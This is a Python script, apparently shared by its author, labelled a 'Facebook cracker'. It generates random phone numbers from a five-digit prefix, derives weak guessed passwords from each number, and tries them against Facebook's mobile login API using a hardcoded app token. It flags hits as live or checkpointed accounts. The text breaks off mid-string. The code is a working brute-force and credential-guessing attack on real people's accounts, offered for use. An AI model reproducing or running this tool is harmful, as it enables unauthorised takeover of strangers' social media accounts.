#Coded by DulLah (fb.me/dulahz)

import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ] 

¦¦+¦¦¦¦+¦¦+¦¦¦¦+¦¦¦¦¦¦+¦¦¦¦+¦¦¦¦+¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦¦¦¦¦¦+¦¦¦¦¦¦+¦¦¦+¦¦¦¦¦¦+¦¦¦+
¦¦¦¦¦¦++¦¦¦¦¦¦¦¦¦¦+--¦¦+¦¦¦¦+¦¦¦¦¦¦¦¦¦¦¦¦+--¦¦+¦¦+----+¦¦+--¦¦+¦¦¦¦¦+--¦¦+¦¦¦
¦¦¦¦¦-+¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦+¦¦¦¦¦¦¦¦+¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦¦¦¦¦¦++¦¦¦¦¦¦¦¦¦¦¦¦¦¦
¦¦+-¦¦+¦¦¦+--¦¦¦¦¦+--¦¦¦¦¦¦+¦¦¦¦¦+----+¦¦+--¦¦¦¦¦+--+¦¦¦¦+--¦¦+¦¦¦¦¦¦¦¦¦¦¦¦¦¦
¦¦¦¦+¦¦+¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦++¦¦¦
+-+¦¦+-++-+¦¦+-++-+¦¦+-++-+¦¦+--+¦¦¦¦¦¦+-+¦¦+-++-+¦¦¦¦¦+-+¦¦+-++-++-----+¦+-+
  Isi nomor awalnya ya kaka
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 62877
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
